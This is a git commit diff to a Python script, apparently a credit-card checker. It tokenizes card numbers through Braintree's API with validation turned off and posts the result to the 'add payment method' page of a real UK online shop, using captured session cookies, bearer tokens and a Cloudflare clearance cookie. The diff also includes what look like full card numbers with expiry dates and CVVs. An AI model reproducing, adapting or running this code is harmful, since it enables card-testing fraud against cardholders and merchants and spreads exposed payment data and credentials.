940a00ba28b2bc9fc21603be374df7eacde19d69
yousef12102008 <moh552vbnm@gmail.com>
2024-06-22 09:23:22 +0300

    Update mk.py

--- mk.py
+++ mk.py
@@ -22,11 +22,13 @@ def Tele(ccx):
 
 
 
+
+
 	headers = {
     'authority': 'payments.braintree-api.com',
     'accept': '*/*',
     'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
-    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MTg5MTMxNDgsImp0aSI6IjNhNjJkZmFlLTg2YmMtNDQ0My04NTMwLTJkYTU4MGUxY2NkYSIsInN1YiI6InRncHBoeWI1OWd3Z2NyaGYiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InRncHBoeWI1OWd3Z2NyaGYiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.f2BH0JOf2zWFFCJxMKJVQ-Ev2rsSuoIxpxZORLSArnCPzvnHYbpIOcHbvBUkty44M7s-1uIumtYA49CkjcrcyA',
+    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MTkxMjMyNDIsImp0aSI6IjIzMzRmZDQ3LWI0OTgtNGQ0YS04NjU0LTdlNWI3MmJlOWQ2ZSIsInN1YiI6Ind5cDM1M2NxM3JwOWZtbmMiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Ind5cDM1M2NxM3JwOWZtbmMiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.jpUOmD_ZAzI3UP4VelEVJfPh0Es1vxKYt0SuK5lHcRR9dVJK958Z3bL4lP6YxWlkJlwxfjC3Im0PdJtO7YcNqg',
     'braintree-version': '2018-05-10',
     'cache-control': 'no-cache',
     'content-type': 'application/json',
@@ -46,7 +48,7 @@ def Tele(ccx):
     'clientSdkMetadata': {
         'source': 'client',
         'integration': 'custom',
-        'sessionId': 'fd7aca3a-775a-4ee8-906a-4010638a8246',
+        'sessionId': 'b1fb4c50-bc9e-4fdf-9929-813c525ede8d',
     },
     'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
     'variables': {
@@ -69,12 +71,7 @@ def Tele(ccx):
 
 # Note: json_data will not be serialized by requests
 # exactly as it was in the original request.
-#data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"fd7aca3a-775a-4ee8-906a-4010638a8246"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"5115581818109910","expirationMonth":"06","expirationYear":"2025","cvv":"291"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
-#response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)
-
-# Note: json_data will not be serialized by requests
-# exactly as it was in the original request.
-#data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"cc9b2066-5875-4559-9504-5e97290a7ab3"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"4403934237294603","expirationMonth":"12","expirationYear":"2027","cvv":"743"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
+#data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"b1fb4c50-bc9e-4fdf-9929-813c525ede8d"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"5115581818109910","expirationMonth":"06","expirationYear":"2025","cvv":"291"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
 #response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)
 
 
@@ -101,59 +98,64 @@ def Tele(ccx):
 
 
 
+
 	cookies = {
-    '_gcl_au': '1.1.1318228119.1717115597',
-    'woocommerce_multicurrency_forced_currency': 'GBP',
-    'woocommerce_multicurrency_language': 'en',
-    'moove_gdpr_popup': '%7B%22strict%22%3A%221%22%2C%22thirdparty%22%3A%220%22%2C%22advanced%22%3A%220%22%7D',
-    'sbjs_migrations': '1418474375998%3D1',
-    'sbjs_current_add': 'fd%3D2024-06-19%2019%3A51%3A41%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.info-stor.co.uk%2Faccount%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.info-stor.co.uk%2Faccount%2Fadd-payment-method%2F',
-    'sbjs_first_add': 'fd%3D2024-06-19%2019%3A51%3A42%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.info-stor.co.uk%2Faccount%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.info-stor.co.uk%2Faccount%2Fadd-payment-method%2F',
-    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
-    'googtrans': '/en/ar',
-    'wordpress_logged_in_5ed5bdfb8b15aca54378ac3a16c4aae5': 'moh552vbnm%7C1720036316%7CQc4Uu0ixTNbFxRho2F5x3W1mX9AEDtpL0u3ioLm9Xjh%7C5375202fb575cdb1d672f4fd892fd6000e07d9fa5ecdde84d7705acbf2390a32',
-    'wp_woocommerce_session_5ed5bdfb8b15aca54378ac3a16c4aae5': '7074%7C%7C1718973212%7C%7C1718969612%7C%7Cd537452138824064df2fc22aab507473',
-    'sbjs_session': 'pgs%3D7%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.info-stor.co.uk%2Faccount%2Fadd-payment-method%2F',
+    'cookieyes-consent': 'consentid:ejJWOUJsU3ZZQUdnaTJmWERjUzJvYVljdzFjenYyaTI,consent:no,action:yes,necessary:yes,functional:no,analytics:no,performance:no,advertisement:no,other:no',
+    'intercom-id-pl9e89b4': 'da724470-2384-453e-8fd9-ffbdb07b1928',
+    'intercom-device-id-pl9e89b4': 'c3022dbc-ff08-42f0-a308-279ef4b027ec',
+    'wordpress_logged_in_82a05395de84089a447a0878739347cd': 'bjjjcjjdj%7C1719561953%7C2i4djexwJyMUT8akoKsr7PcuxyDvYRfVClbfTgtNM1w%7C4dbeb84a9b3a4f1392ad29971578c4682909239e57e8ba08983a21c7bdcea7e4',
+    'cf_clearance': 'rf4ZTXR3b_nwU.S9do5FuPKzw.7d1.jNxHE4k9Z7ejw-1719036565-1.0.1.1-7lHl8SZgm.CkJAcOho0RHAc7T9spmNv1jpcCRm5VdVXyL6Q6Xy4LV5H7Lar_W5RTvlbcBT8UAij3By4eK.QPzw',
+    'intercom-session-pl9e89b4': 'L3NaTmJWdGUrSkNwTkJDb20rZ2pRbTV6aW9IWUJKU0pkeUpYdG8wNmg3T3oyVzZKeFdPUWRENmhlZkk1WTd5Vi0tMjZPUDkvZi90OTQ5NDFBYk1vaUt4Zz09--9bf9c037d70b74d586361b8cb48aafc22fe11af9',
 }
 
 	headers = {
-    'authority': 'www.info-stor.co.uk',
+    'authority': 'www.naturaw.co.uk',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
     'cache-control': 'no-cache',
     'content-type': 'application/x-www-form-urlencoded',
-    # 'cookie': '_gcl_au=1.1.1318228119.1717115597; woocommerce_multicurrency_forced_currency=GBP; woocommerce_multicurrency_language=en; moove_gdpr_popup=%7B%22strict%22%3A%221%22%2C%22thirdparty%22%3A%220%22%2C%22advanced%22%3A%220%22%7D; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-06-19%2019%3A51%3A41%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.info-stor.co.uk%2Faccount%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.info-stor.co.uk%2Faccount%2Fadd-payment-method%2F; sbjs_first_add=fd%3D2024-06-19%2019%3A51%3A42%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.info-stor.co.uk%2Faccount%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.info-stor.co.uk%2Faccount%2Fadd-payment-method%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; googtrans=/en/ar; wordpress_logged_in_5ed5bdfb8b15aca54378ac3a16c4aae5=moh552vbnm%7C1720036316%7CQc4Uu0ixTNbFxRho2F5x3W1mX9AEDtpL0u3ioLm9Xjh%7C5375202fb575cdb1d672f4fd892fd6000e07d9fa5ecdde84d7705acbf2390a32; wp_woocommerce_session_5ed5bdfb8b15aca54378ac3a16c4aae5=7074%7C%7C1718973212%7C%7C1718969612%7C%7Cd537452138824064df2fc22aab507473; sbjs_session=pgs%3D7%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.info-stor.co.uk%2Faccount%2Fadd-payment-method%2F',
-    'origin': 'https://www.info-stor.co.uk',
+    # 'cookie': 'cookieyes-consent=consentid:ejJWOUJsU3ZZQUdnaTJmWERjUzJvYVljdzFjenYyaTI,consent:no,action:yes,necessary:yes,functional:no,analytics:no,performance:no,advertisement:no,other:no; intercom-id-pl9e89b4=da724470-2384-453e-8fd9-ffbdb07b1928; intercom-device-id-pl9e89b4=c3022dbc-ff08-42f0-a308-279ef4b027ec; wordpress_logged_in_82a05395de84089a447a0878739347cd=bjjjcjjdj%7C1719561953%7C2i4djexwJyMUT8akoKsr7PcuxyDvYRfVClbfTgtNM1w%7C4dbeb84a9b3a4f1392ad29971578c4682909239e57e8ba08983a21c7bdcea7e4; cf_clearance=rf4ZTXR3b_nwU.S9do5FuPKzw.7d1.jNxHE4k9Z7ejw-1719036565-1.0.1.1-7lHl8SZgm.CkJAcOho0RHAc7T9spmNv1jpcCRm5VdVXyL6Q6Xy4LV5H7Lar_W5RTvlbcBT8UAij3By4eK.QPzw; intercom-session-pl9e89b4=L3NaTmJWdGUrSkNwTkJDb20rZ2pRbTV6aW9IWUJKU0pkeUpYdG8wNmg3T3oyVzZKeFdPUWRENmhlZkk1WTd5Vi0tMjZPUDkvZi90OTQ5NDFBYk1vaUt4Zz09--9bf9c037d70b74d586361b8cb48aafc22fe11af9',
+    'origin': 'https://www.naturaw.co.uk',
     'pragma': 'no-cache',
-    'referer': 'https://www.info-stor.co.uk/account/add-payment-method/',
+    'referer': 'https://www.naturaw.co.uk/my-account/add-payment-method/',
     'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+    'sec-ch-ua-arch': '""',
+    'sec-ch-ua-bitness': '""',
+    'sec-ch-ua-full-version': '"124.0.6327.4"',
+    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
     'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"23053RN02A"',
     'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"14.0.0"',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
     'sec-fetch-site': 'same-origin',
-    'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
     'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
 }
 
-	data = {
-    'payment_method': 'braintree_credit_card',
-    'wc-braintree-credit-card-card-type': 'master-card',
-    'wc-braintree-credit-card-3d-secure-enabled': '',
-    'wc-braintree-credit-card-3d-secure-verified': '',
-    'wc-braintree-credit-card-3d-secure-order-total': '0.00',
-    'wc_braintree_credit_card_payment_nonce': tok,
-    'wc_braintree_device_data': '',
-    'wc-braintree-credit-card-tokenize-payment-method': 'true',
-    'woocommerce-add-payment-method-nonce': '93886cea29',
-    '_wp_http_referer': '/account/add-payment-method/',
-    'woocommerce_add_payment_method': '1',
-}
+	data = [
+    ('payment_method', 'braintree_credit_card'),
+    ('wc-braintree-credit-card-card-type', 'master-card'),
+    ('wc-braintree-credit-card-3d-secure-enabled', ''),
+    ('wc-braintree-credit-card-3d-secure-verified', ''),
+    ('wc-braintree-credit-card-3d-secure-order-total', '0.00'),
+    ('wc_braintree_credit_card_payment_nonce', tok,),
+    ('wc_braintree_device_data', '{"correlation_id":"f859f0484f9fb8c81ed513b3765126b8"}'),
+    ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
+    ('wc_braintree_paypal_payment_nonce', ''),
+    ('wc_braintree_device_data', '{"correlation_id":"f859f0484f9fb8c81ed513b3765126b8"}'),
+    ('wc-braintree-paypal-context', 'shortcode'),
+    ('wc_braintree_paypal_amount', '0.00'),
+    ('wc_braintree_paypal_currency', 'GBP'),
+    ('wc_braintree_paypal_locale', 'en_gb'),
+    ('wc-braintree-paypal-tokenize-payment-method', 'true'),
+    ('woocommerce-add-payment-method-nonce', '8aaa863334'),
+    ('_wp_http_referer', '/my-account/add-payment-method/'),
+    ('woocommerce_add_payment_method', '1'),
+]
 
-	response = requests.post('https://www.info-stor.co.uk/account/add-payment-method/', cookies=cookies, headers=headers, data=data)
+	response = requests.post('https://www.naturaw.co.uk/my-account/add-payment-method/', cookies=cookies, headers=headers, data=data)
 	text=(response.text)
 	import re
 	pattern = r"Status code \d+: (.+?)\s*</li>"
